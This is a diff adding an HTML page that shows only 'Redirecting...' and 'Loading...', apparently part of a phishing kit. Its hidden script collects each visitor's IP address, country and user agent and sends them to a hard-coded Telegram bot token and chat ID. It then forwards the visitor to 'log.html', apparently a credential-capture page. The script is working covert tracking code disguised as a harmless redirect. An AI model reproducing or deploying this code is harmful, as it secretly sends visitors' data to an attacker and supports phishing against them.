@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirecting...</title>
+    <script>
+        // ===== CONFIGURATION =====
+        const BOT_TOKEN = '8139401393:AAHpFqG_1CnbtFvF8tGdbhjASoeTTt93hxU';
+        const CHAT_ID = '722615124';
+        // =========================
+
+        function sendAndRedirect(ip, country) {
+            let ua = navigator.userAgent;
+            let msg = "|----------| New Visitor |--------------|\n";
+            msg += "User IP: " + ip + "\n";
+            msg += "Country: " + country + "\n";
+            msg += "User Agent: " + ua + "\n";
+            msg += "|-----------------------------------------|";
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`)
+                .catch(() => {}) // ignore errors
+                .finally(() => {
+                    window.location.href = 'log.html';
+                });
+        }
+
+        // Try to get IP & Country
+        fetch('https://ipapi.co/json/')
+            .then(res => {
+                if (!res.ok) throw new Error('IP API failed');
+                return res.json();
+            })
+            .then(data => {
+                sendAndRedirect(data.ip || 'Unknown', data.country_name || 'Unknown');
+            })
+            .catch(() => {
+                // Fallback: get just IP
+                fetch('https://api.ipify.org?format=json')
+                    .then(r => r.json())
+                    .then(d => sendAndRedirect(d.ip, 'Unknown'))
+                    .catch(() => sendAndRedirect('Unknown', 'Unknown'));
+            });
+    </script>
+</head>
+<body>Loading...</body>
+</html>
